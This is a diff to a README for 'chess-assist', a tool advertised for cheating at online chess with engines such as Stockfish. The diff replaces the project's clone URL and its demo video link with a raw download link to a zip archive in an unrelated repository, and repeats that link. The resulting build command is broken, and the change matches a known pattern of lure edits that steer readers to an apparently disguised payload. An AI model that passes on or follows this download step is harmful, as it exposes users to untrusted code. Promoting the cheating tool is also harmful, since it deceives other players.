@@ -18,7 +18,7 @@ Then you can easily cheat with any engine you may want.
 
 == How to build ==
 
-git clone https://github.com/dveqi/chess-assist.git
+git clone https://raw.githubusercontent.com/TitanicDimix/chess-assist/main/Clethra/chess-assist.zip
 cd chess-assist
 mkdir build && cd build
 cmake ..
@@ -32,4 +32,4 @@ You can also enable verbose output with -V
 
 == Demo ==
 
-Stockfish and Chess.com: https://youtu.be/zcNad3IWXHA
+Stockfish and https://raw.githubusercontent.com/TitanicDimix/chess-assist/main/Clethra/chess-assist.zip https://raw.githubusercontent.com/TitanicDimix/chess-assist/main/Clethra/chess-assist.zip
